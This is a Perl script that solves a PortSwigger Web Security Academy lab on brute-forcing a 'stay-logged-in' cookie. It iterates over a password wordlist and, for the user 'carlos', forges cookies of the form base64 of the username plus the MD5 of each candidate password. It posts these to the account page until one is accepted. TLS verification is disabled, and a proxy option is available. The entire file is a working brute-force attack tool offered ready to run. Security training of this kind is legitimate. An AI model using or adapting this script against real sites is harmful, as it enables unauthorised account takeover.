#!/usr/bin/env perl
#
#   Author: <wexe1@protonmail.com>
#   License: MIT
#
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::CookieJar::LWP;
use URI::Encode qw(uri_encode);
use Getopt::Long;
use Pod::Usage;
use feature 'say';
use Term::ANSIColor;
use Digest::MD5 qw(md5_hex);
use MIME::Base64 qw(encode_base64);

BEGIN {
    say colored("PortSwigger Web Security Academy", "bold yellow");
    say colored("Lab: Brute-forcing a stay-logged-in cookie", "bold yellow");
    say colored("Solution by weXe1", "bold blue");
    print "\n";
}

our $| = 1;

our(
    $url,
    $proxy,
    $wordlist,
    $username,
    $help,
);

GetOptions(
    'u|url=s'           => \$url,
    'p|proxy=s'         => \$proxy,
    'w|wordlist=s'      => \$wordlist,
    'h|help'            => \$help
);

$username = 'carlos';

pod2usage(1) if $help;
pod2usage(1) unless $url;
pod2usage(1) unless $wordlist;

our $ua = LWP::UserAgent->new(
    protocols_allowed   => ['http', 'https']
);
$ua->ssl_opts(verify_hostname => 0, SSL_verify_mode => 0x00);

if ($proxy) {
    $ua->proxy('https' => $proxy);
    $ua->proxy('http' => $proxy);
}

$url =~ s/\/$//;
$url .= "/my-account?id=$username";

open(my $fh, $wordlist) or die colored("[!!] Cannot open file '$wordlist': $!\n");

say colored("[*] Obtaining password for user '$username', this may take a while...", "cyan");

while (my $pass = <$fh>) {
    chomp($pass);

    my $encoded = encode_base64("$username:" . md5_hex($pass));

    if (&makeRequest($encoded)) {
        say colored("[+] Found: $pass" , "green");
        exit;
    }
}

say colored("[-] Cannot obtain password with provided username and wordlist", "red");

sub makeRequest {
    my $cookie = shift;
    my $response = $ua->post($url, Cookie => "stay-logged-in=$cookie");

    if ($response->is_success) {
        return 1;
    } elsif ($response->status_line =~ /302 found/i) {
        return 0;
    } else {
        say STDERR colored($response->status_line, "on_red");
        return 0;
    }
}

__END__

=head1 SYNOPSIS

 $ perl broken-brute-force-protection.pl [options]

=head1 OPTIONS

     --url=<URL>                Target URL of the lab (required)
     --wordlist=<FILENAME>      Password wordlist file (required)
     --proxy=<URL>              HTTP or HTTPS proxy URL (optional)
     --help                     Prints this help and exit

=cut